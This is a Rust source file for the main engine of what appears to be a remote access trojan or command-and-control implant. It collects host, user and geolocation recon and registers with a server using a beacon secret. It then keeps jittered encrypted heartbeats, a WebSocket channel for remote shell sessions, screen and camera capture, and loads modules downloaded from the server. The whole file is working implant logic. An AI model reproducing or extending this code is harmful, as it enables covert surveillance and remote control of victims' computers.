use serde_json::Value;

use libra_common::protocol::WebSocketMessage;
use libra_crypto::AgentCrypto;
use libra_comm::http::HttpCommunicator;
use libra_comm::ws::{WsCommunicator, WsSender, send_msg_via};

use crate::config::ConfigManager;
use crate::engine::heartbeat::{heartbeat_tick, jittered_interval};
use crate::engine::shell::ShellSession;

mod dispatcher;
mod heartbeat;
mod shell;
mod streams;
mod utils;

pub struct AgentEngine {
    config: ConfigManager,
    crypto: AgentCrypto,
    http: Option<HttpCommunicator>,
    ws: Option<WsCommunicator>,
    ws_tx: Option<WsSender>,
    agent_id: String,
    screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
    camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
}

impl AgentEngine {
    pub fn new(config: ConfigManager) -> Self {
        Self {
            config,
            crypto: AgentCrypto::new(),
            http: None,
            ws: None,
            ws_tx: None,
            agent_id: String::new(),
            screen_session: std::sync::Mutex::new(None),
            camera_session: std::sync::Mutex::new(None),
        }
    }

    pub fn agent_id(&self) -> &str { &self.agent_id }

    // ── Main entry point ─────────────────────────────────────────────

    pub async fn run(&mut self) -> Result<(), String> {
        self.crypto.generate_key_pair();

        let hw = libra_platform::hardware::collect();
        let hw_json = libra_platform::hardware::serialize(&hw);

        libra_modules::recon::NetworkInfo::warmup_geo().await;

        let http = HttpCommunicator::new(
            &self.config.server_url,
            &self.config.register_path,
            &self.config.heartbeat_path,
            &self.config.result_path,
        );

        let sys_json = libra_modules::recon::SystemInfo::collect();
        let sys: Value = serde_json::from_str(&sys_json).unwrap_or(Value::Null);
        let hostname = sys["hostname"].as_str().unwrap_or("unknown");
        let user_name = sys["userName"].as_str().unwrap_or("unknown");
        let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
        let arch = sys["arch"].as_str().unwrap_or("unknown");

        let (agent_id, session_key) = http.register(
            hostname, user_name, os_version, arch,
            self.crypto.rsa_public_key().unwrap_or(""),
            &self.config.beacon_secret,
            &hw_json,
        ).await?;

        // Establish AES-256-GCM session key from the RSA-encrypted blob.
        if let Some(key) = session_key {
            if let Err(e) = self.crypto.set_session_key(&key) {
                eprintln!("[WARN] Failed to set session key: {}", e);
            } else {
                eprintln!("[INFO] AES-256-GCM session key established");
            }
        } else {
            eprintln!("[WARN] Server did not return a session key (encryption disabled)");
        }

        eprintln!("[INFO] registered | agent_id={} | hostname={}", agent_id, hostname);
        self.agent_id = agent_id;
        self.http = Some(http);

        let mut ws = WsCommunicator::new(&self.config.ws_url(), &self.agent_id);
        if let Some(key) = self.crypto.session_key() {
            ws.set_session_key(key);
        }
        for i in 0..3 {
            match ws.connect().await {
                Ok(()) => break,
                Err(e) if i == 2 => return Err(format!("WS connect failed: {}", e)),
                Err(_) => tokio::time::sleep(std::time::Duration::from_secs(2)).await,
            }
        }
        let tx = ws.sender();
        self.ws_tx = Some(tx);
        self.ws = Some(ws);

        self.main_loop().await
    }

    // ── Main event loop ─────────────────────────────────────────────

    async fn main_loop(&mut self) -> Result<(), String> {
        // Take ws out of self so receive() and handle_ws_message() don't conflict
        let mut ws = self.ws.take().ok_or("WS not initialized")?;
        let tx = self.ws_tx.as_ref().ok_or("WS sender not initialized")?.clone();
        let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
        let agent_id = self.agent_id.clone();
        let server_url = self.config.server_url.clone();
        let register_path = self.config.register_path.clone();
        let heartbeat_path = self.config.heartbeat_path.clone();
        let result_path = self.config.result_path.clone();

        let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
        let mut shell_session: Option<ShellSession> = None;
        let hb_key = self.crypto.session_key();
        let hb_interval_ms = self.config.heartbeat_interval_ms;
        let hb_jitter = self.config.jitter_percent;

        // Cloud module manager — downloads modules on demand (shared with the
        // heartbeat task that executes one-shot tasks).
        let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(
            crate::module_manager::ModuleManager::new(
                &server_url, &register_path, &heartbeat_path, &result_path,
                agent_id.clone(), hb_key,
            ),
        ));

        // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
        // with the session key, with per-tick jitter. Signals a re-register if
        // the session is lost (e.g. the server restarted).
        let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
        let hb_mm = module_manager.clone();
        let hb_reconnect = reconnect_tx.clone();
        tokio::spawn(async move {
            let hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
            loop {
                match heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref(), &hb_mm).await {
                    Err(e) if e == "SESSION_LOST" => {
                        eprintln!("[WARN] session lost — triggering re-registration");
                        let _ = hb_reconnect.send(());
                        break;
                    }
                    _ => {}
                }
                tokio::time::sleep(std::time::Duration::from_millis(
                    jittered_interval(hb_interval_ms, hb_jitter),
                )).await;
            }
        });

        // Main event loop: WS receive + shell output forwarding.
        // The WebSocket is split: ws.receive() doesn't block sends via tx.
        let mut reconnect_delay_ms = 1000u64;
        loop {
            tokio::select! {
                _ = reconnect_rx.recv() => {
                    eprintln!("[INFO] re-registering with server");
                    break;
                }

                Some(msg) = shell_rx.recv() => {
                    eprintln!("[SEND] {} | rid={} | data={}",
                        msg.msg_type,
                        msg.request_id.as_deref().unwrap_or("-"),
                        msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                    );
                    send_msg_via(&tx, &msg).await;
                }

                result = ws.receive() => {
                    match result {
                        Some(msg) => {
                            reconnect_delay_ms = 1000;
                            eprintln!("[RECV] {} | rid={} | data={}",
                                msg.msg_type,
                                msg.request_id.as_deref().unwrap_or("-"),
                                msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                            );
                            self.handle_ws_message(
                                msg, &tx, &shell_tx, &mut shell_session, &module_manager
                            ).await;
                        }
                        None => {
                            eprintln!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
                            tokio::time::sleep(std::time::Duration::from_millis(reconnect_delay_ms)).await;
                            if ws.connect().await.is_ok() {
                                reconnect_delay_ms = 1000;
                                self.ws_tx = Some(ws.sender());
                            } else {
                                reconnect_delay_ms = (reconnect_delay_ms * 2).min(60_000);
                            }
                        }
                    }
                }
            }
        }

        // Put ws back before returning
        self.ws = Some(ws);
        Err("Agent main loop ended".into())
    }
}
